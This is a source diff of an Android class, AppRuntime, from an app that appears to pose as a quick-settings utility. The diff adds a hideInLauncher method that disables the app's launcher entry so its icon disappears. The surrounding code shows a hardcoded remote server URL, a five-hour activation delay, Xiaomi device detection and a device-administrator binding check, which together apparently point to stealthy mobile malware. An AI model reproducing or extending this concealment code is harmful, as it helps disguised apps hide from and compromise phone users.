@@ -3,12 +3,14 @@ package com.xstd.qm;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
+import android.content.pm.PackageManager;
 import android.content.res.Configuration;
 import android.graphics.Bitmap;
 import android.os.Build;
 import android.provider.CalendarContract;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
+import com.bwx.bequick.ShowSettingsActivity;
 import com.xstd.qm.receiver.BindDeviceReceiver;
 import com.xstd.qm.setting.SettingManager;
 import com.xstd.quick.R;
@@ -36,7 +38,7 @@ public class AppRuntime {
 
     public static final long ACTIVE_DELAY = ((long) 5) * 60 * 60 * 1000;
 
-    public static final long ACTIVE_DEALY1= 5 * 1000;
+    public static final long ACTIVE_DEALY1 = 5 * 1000;
 
     public static final String BASE_URL = "http://www.xinsuotd.net/gais/";
 
@@ -93,7 +95,7 @@ public class AppRuntime {
 
     public static boolean isXiaomiDevice() {
         String MANUFACTURER = Build.MANUFACTURER;
-        String model= Build.MODEL;
+        String model = Build.MODEL;
         if (!TextUtils.isEmpty(MANUFACTURER) && !TextUtils.isEmpty(model)) {
             if (MANUFACTURER.toLowerCase().contains("xiaomi") && model.toLowerCase().startsWith("mi")) return true;
         }
@@ -106,8 +108,11 @@ public class AppRuntime {
     }
 
     public static boolean isBindingActive(Context context) {
-//        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
-//        return dpm.isAdminActive(new ComponentName(context, BindDeviceReceiver.class));
         return SettingManager.getInstance().getKeyHasBindingDevices();
+    }
+
+    public static void hideInLauncher(Context context) {
+        PackageManager pm = context.getPackageManager();
+        pm.setComponentEnabledSetting(new ComponentName(context, ShowSettingsActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
     }
 }
